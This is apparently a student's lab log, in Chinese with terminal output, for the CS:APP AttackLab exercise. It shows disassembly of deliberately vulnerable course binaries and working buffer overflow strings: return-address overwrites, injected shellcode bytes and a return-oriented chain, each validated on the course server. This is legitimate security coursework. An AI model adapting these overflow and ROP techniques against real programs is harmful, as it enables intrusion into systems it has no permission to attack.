---
title: AttackLab
date: 2026-05-11
tag:
  - exp
  - cs
---

# AttackLab

---
- [x] 我在调整网络 完成
- [x] 上传并且解压完成：
```bash
aobzii@aobzii-VMware-Virtual-Platform:~/桌面$ ssh B24040307@10.160.106.190
B24040307@10.160.106.190's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 6.5.0-25-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

Expanded Security Maintenance for Applications is not enabled.

438 updates can be applied immediately.
436 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

30 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Last login: Tue May  5 17:00:48 2026 from 10.163.209.196
B24040307@ICS:~$ tar -xvf target48.tar
target48/README.txt
target48/ctarget
target48/rtarget
target48/farm.c
target48/cookie.txt
target48/hex2raw
B24040307@ICS:~$ 
```
- [x] 上传printf.so 到服务器
```bash
aobzii@aobzii-VMware-Virtual-Platform:~/桌面$ scp /home/aobzii/下载/printf.so B24040307@10.160.106.190:/home/B24040307/target48
B24040307@10.160.106.190's password: 
printf.so                                     100%   32KB 214.7KB/s   00:00    
```
- [x] 连接服务器
```bash
ssh B24040307@10.160.106.190
```
- [x] 连接确定文件在实验服务器文件夹上
```bash
B24040307@ICS:~$ ls
bomb62	bomb62.tar  lab2  snap	target48  target48.tar
B24040307@ICS:~$ cd target48
B24040307@ICS:~/target48$ ls
cookie.txt  ctarget  farm.c  hex2raw  printf.so  README.txt  rtarget
B24040307@ICS:~/target48$ 
```
- [x] 获得个人cookie
```bash
B24040307@ICS:~/target48$ cat cookie.txt
0x1c2a3245
```
- [x] 加载pirntf.so 然后测试
```bash
B24040307@ICS:~/target48$ LD_PRELOAD=./printf.so ./ctarget -q
Cookie: 0x1c2a3245
Type string:2024
No exploit.  Getbuf returned 0x1
Normal return
```
- [x]  objdump -d ctarget相关的操作
```bash
// 子程序1
B24040307@ICS:~/target48$ objdump -d ctarget | grep -A20 "<getbuf>"
0000000000401f09 <getbuf>:
  401f09:	f3 0f 1e fa          	endbr64 
  401f0d:	48 83 ec 18          	sub    $0x18,%rsp
  401f11:	48 89 e7             	mov    %rsp,%rdi
  401f14:	e8 ad 02 00 00       	call   4021c6 <Gets>
  401f19:	b8 01 00 00 00       	mov    $0x1,%eax
  401f1e:	48 83 c4 18          	add    $0x18,%rsp
  401f22:	c3                   	ret    

0000000000401f23 <touch1>:
  401f23:	f3 0f 1e fa          	endbr64 
  401f27:	50                   	push   %rax
  401f28:	58                   	pop    %rax
  401f29:	48 83 ec 08          	sub    $0x8,%rsp
  401f2d:	c7 05 15 56 00 00 01 	movl   $0x1,0x5615(%rip)        # 40754c <vlevel>
  401f34:	00 00 00 
  401f37:	48 8d 3d 98 23 00 00 	lea    0x2398(%rip),%rdi        # 4042d6 <_IO_stdin_used+0x2d6>
  401f3e:	e8 7d f3 ff ff       	call   4012c0 <puts@plt>
  401f43:	bf 01 00 00 00       	mov    $0x1,%edi
  401f48:	e8 fb 04 00 00       	call   402448 <validate>
  401f4d:	bf 00 00 00 00       	mov    $0x0,%edi
--
  4020f7:	e8 0d fe ff ff       	call   401f09 <getbuf>
  4020fc:	89 c2                	mov    %eax,%edx
  4020fe:	48 8d 35 93 22 00 00 	lea    0x2293(%rip),%rsi        # 404398 <_IO_stdin_used+0x398>
  402105:	bf 01 00 00 00       	mov    $0x1,%edi
  40210a:	b8 00 00 00 00       	mov    $0x0,%eax
  40210f:	e8 cc f2 ff ff       	call   4013e0 <__printf_chk@plt>
  402114:	48 83 c4 08          	add    $0x8,%rsp
  402118:	c3                   	ret    

0000000000402119 <save_char>:
  402119:	8b 05 45 60 00 00    	mov    0x6045(%rip),%eax        # 408164 <gets_cnt>
  40211f:	3d ff 03 00 00       	cmp    $0x3ff,%eax
  402124:	7f 4a                	jg     402170 <save_char+0x57>
  402126:	89 f9                	mov    %edi,%ecx
  402128:	c0 e9 04             	shr    $0x4,%cl
  40212b:	8d 14 40             	lea    (%rax,%rax,2),%edx
  40212e:	4c 8d 05 8b 25 00 00 	lea    0x258b(%rip),%r8        # 4046c0 <trans_char>
  402135:	83 e1 0f             	and    $0xf,%ecx
  402138:	45 0f b6 0c 08       	movzbl (%r8,%rcx,1),%r9d
  40213d:	48 8d 0d 1c 54 00 00 	lea    0x541c(%rip),%rcx        # 407560 <gets_buf>
  402144:	48 63 f2             	movslq %edx,%rsi
  
// 子程序2
B24040307@ICS:~/target48$ objdump -d ctarget | grep -A20 "<touch1>"
0000000000401f23 <touch1>:
  401f23:	f3 0f 1e fa          	endbr64 
  401f27:	50                   	push   %rax
  401f28:	58                   	pop    %rax
  401f29:	48 83 ec 08          	sub    $0x8,%rsp
  401f2d:	c7 05 15 56 00 00 01 	movl   $0x1,0x5615(%rip)        # 40754c <vlevel>
  401f34:	00 00 00 
  401f37:	48 8d 3d 98 23 00 00 	lea    0x2398(%rip),%rdi        # 4042d6 <_IO_stdin_used+0x2d6>
  401f3e:	e8 7d f3 ff ff       	call   4012c0 <puts@plt>
  401f43:	bf 01 00 00 00       	mov    $0x1,%edi
  401f48:	e8 fb 04 00 00       	call   402448 <validate>
  401f4d:	bf 00 00 00 00       	mov    $0x0,%edi
  401f52:	e8 d9 f4 ff ff       	call   401430 <exit@plt>

0000000000401f57 <touch2>:
  401f57:	f3 0f 1e fa          	endbr64 
  401f5b:	50                   	push   %rax
  401f5c:	58                   	pop    %rax
  401f5d:	48 83 ec 08          	sub    $0x8,%rsp
  401f61:	89 fa                	mov    %edi,%edx
  401f63:	c7 05 df 55 00 00 02 	movl   $0x2,0x55df(%rip)        # 40754c <vlevel>
  
// 子程序3
B24040307@ICS:~/target48$ objdump -d ctarget | grep -A30 "<touch2>"
0000000000401f57 <touch2>:
  401f57:	f3 0f 1e fa          	endbr64 
  401f5b:	50                   	push   %rax
  401f5c:	58                   	pop    %rax
  401f5d:	48 83 ec 08          	sub    $0x8,%rsp
  401f61:	89 fa                	mov    %edi,%edx
  401f63:	c7 05 df 55 00 00 02 	movl   $0x2,0x55df(%rip)        # 40754c <vlevel>
  401f6a:	00 00 00 
  401f6d:	39 3d e1 55 00 00    	cmp    %edi,0x55e1(%rip)        # 407554 <cookie>
  401f73:	74 2a                	je     401f9f <touch2+0x48>
  401f75:	48 8d 35 a4 23 00 00 	lea    0x23a4(%rip),%rsi        # 404320 <_IO_stdin_used+0x320>
  401f7c:	bf 01 00 00 00       	mov    $0x1,%edi
  401f81:	b8 00 00 00 00       	mov    $0x0,%eax
  401f86:	e8 55 f4 ff ff       	call   4013e0 <__printf_chk@plt>
  401f8b:	bf 02 00 00 00       	mov    $0x2,%edi
  401f90:	e8 87 05 00 00       	call   40251c <fail>
  401f95:	bf 00 00 00 00       	mov    $0x0,%edi
  401f9a:	e8 91 f4 ff ff       	call   401430 <exit@plt>
  401f9f:	48 8d 35 52 23 00 00 	lea    0x2352(%rip),%rsi        # 4042f8 <_IO_stdin_used+0x2f8>
  401fa6:	bf 01 00 00 00       	mov    $0x1,%edi
  401fab:	b8 00 00 00 00       	mov    $0x0,%eax
  401fb0:	e8 2b f4 ff ff       	call   4013e0 <__printf_chk@plt>
  401fb5:	bf 02 00 00 00       	mov    $0x2,%edi
  401fba:	e8 89 04 00 00       	call   402448 <validate>
  401fbf:	eb d4                	jmp    401f95 <touch2+0x3e>

0000000000401fc1 <hexmatch>:
  401fc1:	f3 0f 1e fa          	endbr64 
  401fc5:	41 54                	push   %r12
  401fc7:	55                   	push   %rbp
  401fc8:	53                   	push   %rbx
  
// 子程序4
B24040307@ICS:~/target48$ objdump -d ctarget | grep -A40 "<touch3>"
0000000000402074 <touch3>:
  402074:	f3 0f 1e fa          	endbr64 
  402078:	53                   	push   %rbx
  402079:	48 89 fb             	mov    %rdi,%rbx
  40207c:	c7 05 c6 54 00 00 03 	movl   $0x3,0x54c6(%rip)        # 40754c <vlevel>
  402083:	00 00 00 
  402086:	48 89 fe             	mov    %rdi,%rsi
  402089:	8b 3d c5 54 00 00    	mov    0x54c5(%rip),%edi        # 407554 <cookie>
  40208f:	e8 2d ff ff ff       	call   401fc1 <hexmatch>
  402094:	85 c0                	test   %eax,%eax
  402096:	74 2d                	je     4020c5 <touch3+0x51>
  402098:	48 89 da             	mov    %rbx,%rdx
  40209b:	48 8d 35 a6 22 00 00 	lea    0x22a6(%rip),%rsi        # 404348 <_IO_stdin_used+0x348>
  4020a2:	bf 01 00 00 00       	mov    $0x1,%edi
  4020a7:	b8 00 00 00 00       	mov    $0x0,%eax
  4020ac:	e8 2f f3 ff ff       	call   4013e0 <__printf_chk@plt>
  4020b1:	bf 03 00 00 00       	mov    $0x3,%edi
  4020b6:	e8 8d 03 00 00       	call   402448 <validate>
  4020bb:	bf 00 00 00 00       	mov    $0x0,%edi
  4020c0:	e8 6b f3 ff ff       	call   401430 <exit@plt>
  4020c5:	48 89 da             	mov    %rbx,%rdx
  4020c8:	48 8d 35 a1 22 00 00 	lea    0x22a1(%rip),%rsi        # 404370 <_IO_stdin_used+0x370>
  4020cf:	bf 01 00 00 00       	mov    $0x1,%edi
  4020d4:	b8 00 00 00 00       	mov    $0x0,%eax
  4020d9:	e8 02 f3 ff ff       	call   4013e0 <__printf_chk@plt>
  4020de:	bf 03 00 00 00       	mov    $0x3,%edi
  4020e3:	e8 34 04 00 00       	call   40251c <fail>
  4020e8:	eb d1                	jmp    4020bb <touch3+0x47>

00000000004020ea <test>:
  4020ea:	f3 0f 1e fa          	endbr64 
  4020ee:	48 83 ec 08          	sub    $0x8,%rsp
  4020f2:	b8 00 00 00 00       	mov    $0x0,%eax
  4020f7:	e8 0d fe ff ff       	call   401f09 <getbuf>
  4020fc:	89 c2                	mov    %eax,%edx
  4020fe:	48 8d 35 93 22 00 00 	lea    0x2293(%rip),%rsi        # 404398 <_IO_stdin_used+0x398>
  402105:	bf 01 00 00 00       	mov    $0x1,%edi
  40210a:	b8 00 00 00 00       	mov    $0x0,%eax
  40210f:	e8 cc f2 ff ff       	call   4013e0 <__printf_chk@plt>
  402114:	48 83 c4 08          	add    $0x8,%rsp
  402118:	c3                   	ret
```
- [x] 创建攻击文件 保存在实验服务器
```bash
B24040307@ICS:~/target48$ cat > ctarget.l1 <<EOF
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
23 1f 40 00 00 00 00 00
EOF
B24040307@ICS:~/target48$ cat ctarget.l1
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
23 1f 40 00 00 00 00 00
```
- [x] 数字对序列转化为对应的字节序列保存
```bash
B24040307@ICS:~/target48$ ./hex2raw < ctarget.l1 > clevel1.txt
B24040307@ICS:~/target48$ ls -l ctarget.l1 clevel1.txt
-rw-rw-r-- 1 B24040307 B24040307 33  5月 11 16:57 clevel1.txt
-rw-rw-r-- 1 B24040307 B24040307 96  5月 11 16:52 ctarget.l1
```
- [x] 不通知服务器的攻击一次
```bash
B24040307@ICS:~/target48$ LD_PRELOAD=./printf.so ./ctarget -q < clevel1.txt
Cookie: 0x1c2a3245
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
	user id	B24040307
	course	15213-f15
	lab	attacklab
	result	48:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 23 1F 40 00 00 00 00 00
```
- [x] 第一个解决与提交
```bash
B24040307@ICS:~/target48$ LD_PRELOAD=./printf.so ./ctarget -q < clevel1.txt
Cookie: 0x1c2a3245
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
	user id	B24040307
	course	15213-f15
	lab	attacklab
	result	48:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 23 1F 40 00 00 00 00 00 
B24040307@ICS:~/target48$ LD_PRELOAD=./printf.so ./ctarget < clevel1.txt
Cookie: 0x1c2a3245
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
```

- [ ] 全部完成
```bash
aobzii@aobzii-VMware-Virtual-Platform:~/桌面$ ssh B24040307@10.160.106.190
B24040307@10.160.106.190's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 6.5.0-25-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

Expanded Security Maintenance for Applications is not enabled.

438 updates can be applied immediately.
436 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

30 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Last login: Mon May 11 16:48:45 2026 from 10.10.240.31
B24040307@ICS:~$ cd target48
B24040307@ICS:~/target48$ ls
clevel1.txt  ctarget	 farm.c   printf.so   rtarget
cookie.txt   ctarget.l1  hex2raw  README.txt
B24040307@ICS:~/target48$ ls -l ctarget.l1 clevel1.txt
-rw-rw-r-- 1 B24040307 B24040307 33  5月 11 16:57 clevel1.txt
-rw-rw-r-- 1 B24040307 B24040307 96  5月 11 16:52 ctarget.l1
B24040307@ICS:~/target48$ LD_PRELOAD=./printf.so ./ctarget -q < clevel1.txt
Cookie: 0x1c2a3245
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
	user id	B24040307
	course	15213-f15
	lab	attacklab
	result	48:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 23 1F 40 00 00 00 00 00 
B24040307@ICS:~/target48$ LD_PRELOAD=./printf.so ./ctarget < clevel1.txt
Cookie: 0x1c2a3245
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
B24040307@ICS:~/target48$ gdb -q ./ctarget \
-ex 'set environment LD_PRELOAD=./printf.so' \
-ex 'break *0x401f11' \
-ex 'run -q' \
-ex 'print/x $rsp' \
-ex 'quit'
Reading symbols from ./ctarget...
Breakpoint 1 at 0x401f11: file buf.c, line 14.
Starting program: /home/B24040307/target48/ctarget -q
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Cookie: 0x1c2a3245

Breakpoint 1, getbuf () at buf.c:14
14	buf.c: 没有那个文件或目录.
$1 = 0x556430f8
A debugging session is active.

	Inferior 1 [process 2658688] will be killed.

Quit anyway? (y or n) y
B24040307@ICS:~/target48$ cat > ctarget.l2 <<EOF
48 c7 c7 45 32 2a 1c c3
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
f8 30 64 55 00 00 00 00
57 1f 40 00 00 00 00 00
EOF
B24040307@ICS:~/target48$ cat ctarget.l2
48 c7 c7 45 32 2a 1c c3
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
f8 30 64 55 00 00 00 00
57 1f 40 00 00 00 00 00
B24040307@ICS:~/target48$ ./hex2raw < ctarget.l2 > clevel2.txt
B24040307@ICS:~/target48$ ls -l ctarget.l2 clevel2.txt
-rw-rw-r-- 1 B24040307 B24040307  41  5月 11 19:23 clevel2.txt
-rw-rw-r-- 1 B24040307 B24040307 120  5月 11 19:23 ctarget.l2
B24040307@ICS:~/target48$ LD_PRELOAD=./printf.so ./ctarget -q < clevel2.txt
Cookie: 0x1c2a3245
Type string:Touch2!: You called touch2(0x1c2a3245)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
	user id	B24040307
	course	15213-f15
	lab	attacklab
	result	48:PASS:0xffffffff:ctarget:2:48 C7 C7 45 32 2A 1C C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 F8 30 64 55 00 00 00 00 57 1F 40 00 00 00 00 00 
B24040307@ICS:~/target48$ LD_PRELOAD=./printf.so ./ctarget < clevel2.txt
Cookie: 0x1c2a3245
Type string:Touch2!: You called touch2(0x1c2a3245)
Valid solution for level 2 with target ctarget
Ouch!: You caused a segmentation fault!
Better luck next time
FAILED
B24040307@ICS:~/target48$ gdb -q ./ctarget \
-ex 'set environment LD_PRELOAD=./printf.so' \
-ex 'break *0x401f11' \
-ex 'run' \
-ex 'print/x $rsp' \
-ex 'quit'
Reading symbols from ./ctarget...
Breakpoint 1 at 0x401f11: file buf.c, line 14.
Starting program: /home/B24040307/target48/ctarget 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Cookie: 0x1c2a3245

Breakpoint 1, getbuf () at buf.c:14
14	buf.c: 没有那个文件或目录.
$1 = 0x556430f8
A debugging session is active.

	Inferior 1 [process 2671211] will be killed.

Quit anyway? (y or n) y
B24040307@ICS:~/target48$ cat > ctarget.l2 <<EOF
48 c7 c7 45 32 2a 1c 68
57 1f 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
f8 30 64 55 00 00 00 00
EOF
B24040307@ICS:~/target48$ ./hex2raw < ctarget.l2 > clevel2.txt
B24040307@ICS:~/target48$ ls -l ctarget.l2 clevel2.txt
-rw-rw-r-- 1 B24040307 B24040307 33  5月 11 19:27 clevel2.txt
-rw-rw-r-- 1 B24040307 B24040307 96  5月 11 19:26 ctarget.l2
B24040307@ICS:~/target48$ LD_PRELOAD=./printf.so ./ctarget -q < clevel2.txt
Cookie: 0x1c2a3245
Type string:Touch2!: You called touch2(0x1c2a3245)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
	user id	B24040307
	course	15213-f15
	lab	attacklab
	result	48:PASS:0xffffffff:ctarget:2:48 C7 C7 45 32 2A 1C 68 57 1F 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 F8 30 64 55 00 00 00 00 
B24040307@ICS:~/target48$ LD_PRELOAD=./printf.so ./ctarget < clevel2.txt
Cookie: 0x1c2a3245
Type string:Touch2!: You called touch2(0x1c2a3245)
Valid solution for level 2 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
B24040307@ICS:~/target48$ gdb -q ./ctarget -ex 'p/x touch3' -ex quit
Reading symbols from ./ctarget...
$1 = 0xf3
B24040307@ICS:~/target48$ gdb -q ./ctarget -ex 'p/x &touch3' -ex quit
Reading symbols from ./ctarget...
$1 = 0x402074
B24040307@ICS:~/target48$ cat > ctarget.l3 <<'EOF'
48 C7 C7 18 31 64 55 68
74 20 40 00 C3 00 00 00
00 00 00 00 00 00 00 00
F8 30 64 55 00 00 00 00
31 63 32 61 33 32 34 35
00
EOF
B24040307@ICS:~/target48$ ./hex2raw < ctarget.l3 > clevel3.txt
B24040307@ICS:~/target48$ LD_PRELOAD=./printf.so ./ctarget -q < clevel3.txt
Cookie: 0x1c2a3245
Type string:Touch3!: You called touch3("1c2a3245")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
	user id	B24040307
	course	15213-f15
	lab	attacklab
	result	48:PASS:0xffffffff:ctarget:3:48 C7 C7 18 31 64 55 68 74 20 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 F8 30 64 55 00 00 00 00 31 63 32 61 33 32 34 35 00 
B24040307@ICS:~/target48$ LD_PRELOAD=./printf.so ./ctarget < clevel3.txt
Cookie: 0x1c2a3245
Type string:Touch3!: You called touch3("1c2a3245")
Valid solution for level 3 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
B24040307@ICS:~/target48$ objdump -d ./rtarget > rtarget.asm
B24040307@ICS:~/target48$ grep -A200 '<start_farm>' rtarget.asm
0000000000402119 <start_farm>:
  402119:	f3 0f 1e fa          	endbr64 
  40211d:	b8 01 00 00 00       	mov    $0x1,%eax
  402122:	c3                   	ret    

0000000000402123 <getval_181>:
  402123:	f3 0f 1e fa          	endbr64 
  402127:	b8 48 89 c7 90       	mov    $0x90c78948,%eax
  40212c:	c3                   	ret    

000000000040212d <setval_210>:
  40212d:	f3 0f 1e fa          	endbr64 
  402131:	c7 07 48 89 c7 c1    	movl   $0xc1c78948,(%rdi)
  402137:	c3                   	ret    

0000000000402138 <addval_493>:
  402138:	f3 0f 1e fa          	endbr64 
  40213c:	8d 87 43 58 94 90    	lea    -0x6f6ba7bd(%rdi),%eax
  402142:	c3                   	ret    

0000000000402143 <setval_394>:
  402143:	f3 0f 1e fa          	endbr64 
  402147:	c7 07 db 58 90 90    	movl   $0x909058db,(%rdi)
  40214d:	c3                   	ret    

000000000040214e <addval_233>:
  40214e:	f3 0f 1e fa          	endbr64 
  402152:	8d 87 48 89 c7 c1    	lea    -0x3e3876b8(%rdi),%eax
  402158:	c3                   	ret    

0000000000402159 <addval_397>:
  402159:	f3 0f 1e fa          	endbr64 
  40215d:	8d 87 fc 48 89 c7    	lea    -0x3876b704(%rdi),%eax
  402163:	c3                   	ret    

0000000000402164 <addval_311>:
  402164:	f3 0f 1e fa          	endbr64 
  402168:	8d 87 58 90 91 c3    	lea    -0x3c6e6fa8(%rdi),%eax
  40216e:	c3                   	ret    

000000000040216f <setval_198>:
  40216f:	f3 0f 1e fa          	endbr64 
  402173:	c7 07 bc 58 90 c3    	movl   $0xc39058bc,(%rdi)
  402179:	c3                   	ret    

000000000040217a <mid_farm>:
  40217a:	f3 0f 1e fa          	endbr64 
  40217e:	b8 01 00 00 00       	mov    $0x1,%eax
  402183:	c3                   	ret    

0000000000402184 <add_xy>:
  402184:	f3 0f 1e fa          	endbr64 
  402188:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  40218c:	c3                   	ret    

000000000040218d <setval_154>:
  40218d:	f3 0f 1e fa          	endbr64 
  402191:	c7 07 89 d1 90 c3    	movl   $0xc390d189,(%rdi)
  402197:	c3                   	ret    

0000000000402198 <addval_168>:
  402198:	f3 0f 1e fa          	endbr64 
  40219c:	8d 87 4b 48 8d e0    	lea    -0x1f72b7b5(%rdi),%eax
  4021a2:	c3                   	ret    

00000000004021a3 <getval_201>:
  4021a3:	f3 0f 1e fa          	endbr64 
  4021a7:	b8 6d ae 89 ce       	mov    $0xce89ae6d,%eax
  4021ac:	c3                   	ret    

00000000004021ad <setval_276>:
  4021ad:	f3 0f 1e fa          	endbr64 
  4021b1:	c7 07 89 ce 91 90    	movl   $0x9091ce89,(%rdi)
  4021b7:	c3                   	ret    

00000000004021b8 <addval_316>:
  4021b8:	f3 0f 1e fa          	endbr64 
  4021bc:	8d 87 48 89 e0 90    	lea    -0x6f1f76b8(%rdi),%eax
  4021c2:	c3                   	ret    

00000000004021c3 <getval_398>:
  4021c3:	f3 0f 1e fa          	endbr64 
  4021c7:	b8 48 89 e0 c2       	mov    $0xc2e08948,%eax
  4021cc:	c3                   	ret    

00000000004021cd <addval_100>:
  4021cd:	f3 0f 1e fa          	endbr64 
  4021d1:	8d 87 09 c2 38 db    	lea    -0x24c73df7(%rdi),%eax
  4021d7:	c3                   	ret    

00000000004021d8 <getval_383>:
  4021d8:	f3 0f 1e fa          	endbr64 
  4021dc:	b8 89 c2 c7 1c       	mov    $0x1cc7c289,%eax
  4021e1:	c3                   	ret    

00000000004021e2 <getval_455>:
  4021e2:	f3 0f 1e fa          	endbr64 
  4021e6:	b8 89 c2 91 c3       	mov    $0xc391c289,%eax
  4021eb:	c3                   	ret    

00000000004021ec <addval_322>:
  4021ec:	f3 0f 1e fa          	endbr64 
  4021f0:	8d 87 89 ce 48 c9    	lea    -0x36b73177(%rdi),%eax
  4021f6:	c3                   	ret    

00000000004021f7 <addval_118>:
  4021f7:	f3 0f 1e fa          	endbr64 
  4021fb:	8d 87 09 ce 90 90    	lea    -0x6f6f31f7(%rdi),%eax
  402201:	c3                   	ret    

0000000000402202 <addval_172>:
  402202:	f3 0f 1e fa          	endbr64 
  402206:	8d 87 48 89 e0 c2    	lea    -0x3d1f76b8(%rdi),%eax
  40220c:	c3                   	ret    

000000000040220d <getval_357>:
  40220d:	f3 0f 1e fa          	endbr64 
  402211:	b8 48 89 e0 c3       	mov    $0xc3e08948,%eax
  402216:	c3                   	ret    

0000000000402217 <getval_329>:
  402217:	f3 0f 1e fa          	endbr64 
  40221b:	b8 89 d1 92 90       	mov    $0x9092d189,%eax
  402220:	c3                   	ret    

0000000000402221 <setval_370>:
  402221:	f3 0f 1e fa          	endbr64 
  402225:	c7 07 34 89 ce 91    	movl   $0x91ce8934,(%rdi)
  40222b:	c3                   	ret    

000000000040222c <setval_182>:
  40222c:	f3 0f 1e fa          	endbr64 
  402230:	c7 07 89 c2 91 c3    	movl   $0xc391c289,(%rdi)
  402236:	c3                   	ret    

0000000000402237 <getval_186>:
  402237:	f3 0f 1e fa          	endbr64 
  40223b:	b8 89 c2 c3 5b       	mov    $0x5bc3c289,%eax
  402240:	c3                   	ret    

0000000000402241 <addval_498>:
  402241:	f3 0f 1e fa          	endbr64 
  402245:	8d 87 8f fb a9 d1    	lea    -0x2e560471(%rdi),%eax
  40224b:	c3                   	ret    

000000000040224c <setval_122>:
  40224c:	f3 0f 1e fa          	endbr64 
  402250:	c7 07 89 c2 00 d2    	movl   $0xd200c289,(%rdi)
  402256:	c3                   	ret    

0000000000402257 <getval_273>:
  402257:	f3 0f 1e fa          	endbr64 
  40225b:	b8 89 d1 00 c0       	mov    $0xc000d189,%eax
  402260:	c3                   	ret    

0000000000402261 <addval_144>:
  402261:	f3 0f 1e fa          	endbr64 
  402265:	8d 87 48 8b e0 c3    	lea    -0x3c1f74b8(%rdi),%eax
  40226b:	c3                   	ret    

000000000040226c <setval_497>:
  40226c:	f3 0f 1e fa          	endbr64 
  402270:	c7 07 89 d1 84 c9    	movl   $0xc984d189,(%rdi)
  402276:	c3                   	ret    

0000000000402277 <getval_429>:
  402277:	f3 0f 1e fa          	endbr64 
  40227b:	b8 89 d1 c7 37       	mov    $0x37c7d189,%eax
  402280:	c3                   	ret    

0000000000402281 <setval_231>:
  402281:	f3 0f 1e fa          	endbr64 
  402285:	c7 07 23 48 a9 e0    	movl   $0xe0a94823,(%rdi)
  40228b:	c3                   	ret    

000000000040228c <getval_200>:
  40228c:	f3 0f 1e fa          	endbr64 
  402290:	b8 89 ce 84 db       	mov    $0xdb84ce89,%eax
  402295:	c3                   	ret    

0000000000402296 <addval_367>:
  402296:	f3 0f 1e fa          	endbr64 
  40229a:	8d 87 99 d1 90 c3    	lea    -0x3c6f2e67(%rdi),%eax
  4022a0:	c3                   	ret    

00000000004022a1 <setval_345>:
  4022a1:	f3 0f 1e fa          	endbr64 
  4022a5:	c7 07 8d ce 20 c9    	movl   $0xc920ce8d,(%rdi)
  4022ab:	c3                   	ret    

00000000004022ac <setval_468>:
  4022ac:	f3 0f 1e fa          	endbr64 
  4022b0:	c7 07 09 d1 38 db    	movl   $0xdb38d109,(%rdi)
  4022b6:	c3                   	ret    

00000000004022b7 <addval_174>:
  4022b7:	f3 0f 1e fa          	endbr64 
  4022bb:	8d 87 48 89 e0 c7    	lea    -0x381f76b8(%rdi),%eax
  4022c1:	c3                   	ret    

00000000004022c2 <setval_230>:
B24040307@ICS:~/target48$ gdb -q ./rtarget -ex 'p/x &touch2' -ex quit
Reading symbols from ./rtarget...
$1 = 0x401f57
B24040307@ICS:~/target48$ cat > rtarget.l2 <<'EOF'
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
74 21 40 00 00 00 00 00
45 32 2a 1c 00 00 00 00
28 21 40 00 00 00 00 00
57 1f 40 00 00 00 00 00
EOF
B24040307@ICS:~/target48$ ./hex2raw < rtarget.l2 > rlevel2.txt
B24040307@ICS:~/target48$ LD_PRELOAD=./printf.so ./rtarget -q < rlevel2.txt
Cookie: 0x1c2a3245
Type string:Oops!: You executed an illegal instruction
Better luck next time
FAIL: Would have posted the following:
	user id	B24040307
	course	15213-f15
	lab	attacklab
	result	48:FAIL:0xffffffff:rtarget:0:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 74 21 40 00 00 00 00 00 45 32 2A 1C 00 00 00 00 28 21 40 00 00 00 00 00 57 1F 40 00 00 00 00 00 
B24040307@ICS:~/target48$ cat > rtarget.l2 <<'EOF'
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
76 21 40 00 00 00 00 00
45 32 2a 1c 00 00 00 00
28 21 40 00 00 00 00 00
57 1f 40 00 00 00 00 00
EOF
B24040307@ICS:~/target48$ ./hex2raw < rtarget.l2 > rlevel2.txt
B24040307@ICS:~/target48$ LD_PRELOAD=./printf.so ./rtarget -q < rlevel2.txt
Cookie: 0x1c2a3245
Type string:Touch2!: You called touch2(0x1c2a3245)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
	user id	B24040307
	course	15213-f15
	lab	attacklab
	result	48:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 76 21 40 00 00 00 00 00 45 32 2A 1C 00 00 00 00 28 21 40 00 00 00 00 00 57 1F 40 00 00 00 00 00 
B24040307@ICS:~/target48$ LD_PRELOAD=./printf.so ./rtarget < rlevel2.txt
Cookie: 0x1c2a3245
Type string:Touch2!: You called touch2(0x1c2a3245)
Valid solution for level 2 with target rtarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
B24040307@ICS:~/target48$ gdb -q ./rtarget -ex 'p/x &touch3' -ex quit
Reading symbols from ./rtarget...
$1 = 0x402074
B24040307@ICS:~/target48$ objdump -d ./rtarget > rtarget.asm
B24040307@ICS:~/target48$ grep -n -A200 '<start_farm>' rtarget.asm
